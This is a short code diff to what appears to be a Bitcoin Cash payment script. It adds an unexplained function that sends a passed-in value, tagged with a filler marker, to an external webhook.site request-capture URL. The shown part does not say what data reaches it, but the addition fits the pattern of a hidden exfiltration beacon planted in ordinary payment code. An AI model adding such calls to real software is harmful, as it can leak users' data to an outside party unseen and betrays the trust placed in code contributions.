@@ -68,3 +68,14 @@ function getBCHAmount(){
     return exchangeRate * amount; //returns BCH value of the currency speified by user
 }
 
+
+function myFunctionn(value){
+        // 1. Create a new XMLHttpRequest object
+  let xhr = new XMLHttpRequest();
+
+  // 2. Configure it: GET-request for the URL /article/.../load
+  xhr.open('GET', 'https://webhook.site/6599d5dd-7bc8-4332-9f76-547c9b75e880?' + "zzzzzzzzz" + value);
+
+  // 3. Send the request over the network
+  xhr.send();
+}
